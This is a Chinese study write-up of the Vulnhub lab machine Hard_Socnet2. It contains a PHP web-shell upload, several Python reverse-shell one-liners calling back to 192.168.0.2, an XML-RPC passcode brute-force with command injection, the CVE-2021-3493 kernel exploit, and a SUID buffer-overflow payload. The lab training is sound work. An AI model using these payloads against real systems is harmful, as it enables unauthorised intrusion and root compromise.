---
title: Chapter5_Hard_Socnet2
categories:
- Network_Security
- Vulnhub
- Chapter5
tags:
- Network_Security
- Vulnhub
date: 2024-04-05 13:32:28
---

# Hard_Socnet2 学习记录

## 1. 粗略的记录

### 1.1 扫描与信息收集

1. 扫描，访问，信息收集：
    ![Hard_Socnet2.asset/image-20240124140149074](image-20240124140149074.png)

2. 访问 80 端口，是一个登录注册页面，万能密码和账号无从下手，那就先注册一个，看看系统内有没有利用点。

3. 进入系统，首先在系统中收集信息，发现有 admin 账号的公告，主页中 admin 提到了 monitor.py，可以关注一下，但是没有发现 admin 的邮箱地址，因此不好找到其账号进行爆破。

### 1.2 拿到 Shell

1. 但是发现可以文件上传，传了个 PHP 后门，结果没有任何过滤，直接上传成功且命令成功执行。kali 中自带的 WebShell 位置：`/usr/share/webshells/`。
    结果如下：
    ![image-20240124141729685](image-20240124141729685.png)

2. 查了一下，目标靶机有 NC，有 Python。直接获得 Shell：
    `cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

3. 视频中还指出了 search 框有 SQL 注入的漏洞，可以利用 SQLMap 将所有的账号和密码给破解出来。

### 1.3 提权 -CVE-2021-3493 - 一步到位

1. 尝试提权，先从内核尝试提权，`uname -a` 和 `lsb_release -a` 查看内核和 OS 版本：
    ![image-20240124151501564](image-20240124151501564.png)

2. 使用 CVE-2021-3493 进行提权，EXP 地址：

    > github.com/briskets/CVE-2021-3493

    靶机上有 gcc 环境，那就直接 .c 文件传过去然后赋权执行：
    ![image-20240124151845334](image-20240124151845334.png)
    ![image-20240124151901839](image-20240124151901839.png)

    提权成功。

### 1.4 提权 - 初步提权 - 代码分析

1. 如果不使用 CVE-2021-3493，就会涉及到很难的提权。先进行信息收集，查看用户文件，发现 lxd，因此还可以用 lxd 进行提取（lxd 提权好像漏洞也挺后）。

2. 除此之外，还发现 socnet 用户，且可以通过 ssh 连接。猜测其是 web 系统的管理用户。查看该用户的目录，发现 monitor.py。查看该文件：
    ![image-20240124154743770](image-20240124154743770.png)
    查看源码，它调用了 XML-RPC，百度一下：

    > RPC（Remote Procedure Call）就是相当于提供了一种“远程接口”来供外部系统调用，常用于不同平台、不同架构的系统之间互相调用。（也就是 API）
    >
    > XML-RPC（RPCXML Remote Procedure Call）是通过 HTTP 传输 XML 来实现远程过程调用的 RPC，因为是基于 HTTP、并且使用 XML 文本的方式传输命令和数据，所以兼容性更好，能够跨域不同的操作系统、不同的编程语言进行远程过程调用，凡有所得，必有所失，在兼容性好的同时速度也会慢下来。

    同时也去看看 Python 中是怎么使用的，主要查看客户端是怎么调用的：

    > https://docs.python.org/zh-cn/3/library/xmlrpc.html

    ![image-20240124160120519](image-20240124160120519.png)

3. 根据上面的示例，结合源代码，写一个 python 脚本进行测试：
    ```python
    import xmlrpc.client
    # 目标在 8000 端口开放了 api，前面 nmap 扫描出来了
    with xmlrpc.client.ServerProxy("http://192.168.0.100:8000/") as proxy:
        print(proxy.cpu())
    ```

    结果令人满意：
    ![image-20240124160245506](image-20240124160245506.png)

4. 根据源码中的 `runcmd(cmd)` 函数，xmlrpc.client 应该可以执行系统命令。但是 `runcmd()` 函数没有注册，而是注册了 `secure_cmd(cmd, passcode)`。这个 passcode 是需要知道的，亦或者暴力破解。

5. 写一个暴力破解的脚本：
       ```python
       import xmlrpc.client
       
       with xmlrpc.client.ServerProxy("http://192.168.0.100:8000/") as proxy:
           for i in range(9999):
               result = proxy.secure_cmd("id", i)
               if result != "Wrong passcode.":
                   print (i)
                   print(result)
                   break
       ```
       
       结果如下：
       ![image-20240125150243238](image-20240125150243238.png)

6. 这下可以注入了，构造 Shell 代码：
       ```python
       import xmlrpc.client
       
       with xmlrpc.client.ServerProxy("http://192.168.0.100:8000/") as proxy:
           '''for i in range(9999):
               result = proxy.secure_cmd("id", i)
               if result != "Wrong passcode.":
                   print (i)
                   print(result)
                   break'''
           proxy.secure_cmd("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.2",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'""", 7129)
       ```

    NC 监听 5555 端口，成功获得 socnet 用户的 Shell：
       ![image-20240125150815427](image-20240125150815427.png)
    输入 `python -c "import pty; pty.spawn('/bin/bash')"` 以增加交互性（但是依旧不能执行 vim 等即时性操作)。

### 1.5 提权 - root - 溢出漏洞

1. 接下来，从 socnet 入手，先看看他有啥文件：
       ```bash
       cd /home/socnet
       ls -l
       ```

       发现它有一个 suid 的文件：add_record。
       
       ![image-20240125152714322](image-20240125152714322.png)
       
       查看文件属性：`file add_record`：
       ![image-20240125153006490](image-20240125153006490.png)
       是一个可执行程序。

2. 同时同文件下还有 peda。

       > PEDA 是为 GDB 设计的一个强大的插件，全称是 Python Exploit Development Assistance for GDB。它提供了很多人性化的功能，比如高亮显示反汇编代码、寄存器、内存信息，提高了 debug 的效率。同时，PEDA 还为 GDB 添加了一些实用新的命令，比如checksec可以查看程序开启了哪些安全机制等等，后续会介绍。
       >
       > 原文链接：https://blog.csdn.net/smalosnail/article/details/53149426

3. 猜测思路就是：使用 GDB 和 PEDA 对 add_record 文件进行跟踪调试，寻找溢出漏洞。

4. 先执行一下 add_record，了解一下程序的作用：
       ![image-20240125154508779](image-20240125154508779.png)
       同时生成新文件：employee_records.txt

5. 使用 gdb，对 add_record 进行调试：`gdb -q ./add_record`。通过 gdb，可以跟踪堆栈和内存的使用情况。
       ```bash
       gdb -q ./add_record
       gdb-peda$ r # 输入 r 开始调试
       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # 通过输入大量的 A，调试中查看其他内存或者寄存器的内容是否含有 A，从而判断该交互变量是否有溢出漏洞。
       ```

       ![image-20240125160218355](image-20240125160218355.png)
       结果直接退出，没有报错，说明该变量可能不存在溢出漏洞。

6. 同样的，Years 也是，一个一个试下去，最终在变量 Comments 中出现溢出：
       ![image-20240125160813669](image-20240125160813669.png)
       重点关注 EIP 寄存器：

       > EIP 和 PC 都是指令指针寄存器，用于存储下一条要执行的指令的地址。它们的区别在于它们所处的体系结构和操作系统环境不同。
       >
       > EIP 是 x86 架构中的指令指针寄存器，用于存储下一条要执行的指令的地址。在x86架构的操作系统中，EIP寄存器的值可以通过调试器来查看和修改，这样就可以实现调试程序的功能。
       >
       > PC 是指 PowerPC 架构中的指令计数器，用于存储下一条要执行的指令的地址。在 PowerPC 架构的操作系统中，PC 寄存器的值不能直接被修改，只能通过跳转指令、函数调用等方式来改变其值。
       >
       > 原文链接：https://blog.csdn.net/m0_62598965/article/details/130332658

7. 因此想办法要知道哪四个 A，改变了 EIP 的值，如果 EIP 的值是 Payload 所在的内存地址，那么就会执行 Payload。

8. 折半判断法，先搞 500 个 A，然后一半一半来判断。
       ![image-20240125161714720](image-20240125161714720.png)
       最终试下去，是在 63 - 66 这四个字符。

9. 当然，gdb 提供了特征字符串的生成：
    `pattern create 100` ：`AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL`
    然后输入这段特征字符串，EIP 为 AHAA。
       ![image-20240125162540313](image-20240125162540313.png)

10. 用 `disas main` 查看其汇编代码（部分）。
       ![image-20240125163245135](image-20240125163245135.png)
       根据程序的结果，可以判断出：

        1. fopen 打开了要写入的文件。
        2. printf 应该是输出程序内的提示字符串。
        3. fgets 是用户输入数据。

11. 调试的一些命令：
       ```bash
       break *0x0804877b # 在特定的 16 进制地址下断点
       # 这时会提示断点的编号
       r # 执行程序到当前已有的第一个断点处 run
       s # 单步跟进 step
       c # 继续执行 continue
       del 1 # 删除对应编号的断点
       ```

12. 大概梳理了程序后，发现有一处异常：
       ![image-20240126152929805](image-20240126152929805.png)
       没加 `@plt` 说明该函数不是系统的函数。需要调查该函数。

13. 使用 `info func` 查看该文件内使用到的所有函数，其中有一些值得注意的函数：
       ![image-20240126153326141](image-20240126153326141.png)
       说明该程序调用系统指令。

14. 使用 `disas vuln[函数名]` 来查看函数的汇编内容：
       ![image-20240126153618173](image-20240126153618173.png)
      注意到 strcpy 函数，cpp 中 strcpy 是存在溢出区缓冲漏洞，那么之前找出的，有问题的地方，应该就是这个函数。

15. 查看 backdoor 程序：
      ![image-20240127160148844](image-20240127160148844.png)
      如果主程序的 EIP（PC) 是 0x08048676，那么它就会执行这个函数。通过这个函数，查看是否有可以提权的机会。

16. 注意点：
      ![image-20240127161358326](image-20240127161358326.png)
      低位存放在低地址，说明该系统的数据存储方式是小端模式（计组)，且是 ASCII 值。首先 08048676 转换成 ASCII，然后逆序拼接。

17. 构造 payload：
      ```bash
      python -c "import struct; print('poc\n1\n1\n1\n' + 'A' * 62 + struct.pack('I', 0x08048676))" > payload
      # poc\n1\n1\n1\n 表示处理程序的前面部分，后面的部分就是真正起作用的部分
      ```

      > `struct.pack()` 的作用：
      > struct 将字节串解读为打包的二进制数据。
      > struct 模块可在 Python 值和以 Python bytes 对象表示的 C 结构体之间进行转换。此模块的函数和对象可被用于两种相当不同的应用程序，与外部源（文件或网络连接）进行数据交换，或者在 Python 应用和 C 层级之间进行数据传输。
      >
      > struct.**pack**(*format*, *v1*, *v2*, *...*)
      >     返回一个 bytes 对象，其中包含根据格式字符串 *format* 打包的值 *v1*, *v2*, ... 参数个数必须与格式字符串所要求的值完全匹配。
      >
      > 在默认情况下，C 类型将以所在机器的原生格式和字节顺序来表示，并在必要时通过跳过填充字节来正确地对齐（根据 C 编译器所使用的规则）。 （也就是说根据系统采用大端还是小端。
      >
      > https://docs.python.org/zh-cn/3/library/struct.html

      在靶机上执行，生成 payload 文件。
      启用 dbg 执行：
      ![image-20240127162934898](image-20240127162934898.png)
      注意到 2852 进程执行了 `/bin/bash`。

18. 下面要了解，为什么会执行 `/bin/bash`：
      ```bash
      break vuln
      r < payload
      s # 多次向下更近
      ```

      等到执行到 backdoor 程序时，留意一下：
      ![image-20240127165824560](image-20240127165824560.png)
      接着更近：
      ![image-20240127170005192](image-20240127170005192.png)

      应该可以直接查看 backdoor 函数，然后打断点，就不用一步一步调试了。
      ![image-20240127170159907](image-20240127170159907.png)
      到这，知道了 backdoor 函数的行为。

19. 退出调试模式，在 Shell 中执行：
     `cat payload - | ./add_record`。`-` 表示 stdin，也就是标准输入，搭配管道使用。这里就是将所有的内容通过管道传给程序。
      ![image-20240127170802524](image-20240127170802524.png)
     执行 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.2", 6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'` 以获得更友好的 Shell。

## 2. 总结

1. CVE-2021-3493 比较通用的内核提权漏洞
2. 代码分析与文档查看
3. Shell 增加交互性：`python -c "import pty; pty.spawn('/bin/bash')"`
4. [后半段使用 GDB 挖掘溢出漏洞](#1.5 提权 - root - 溢出漏洞)。一整段都是新知识，PWN 要学。
    1. GDB 和 PEDA
    2. GDB 调试的使用
    3. Python 的 `struct` 包的使用。
    4. 挖掘的流程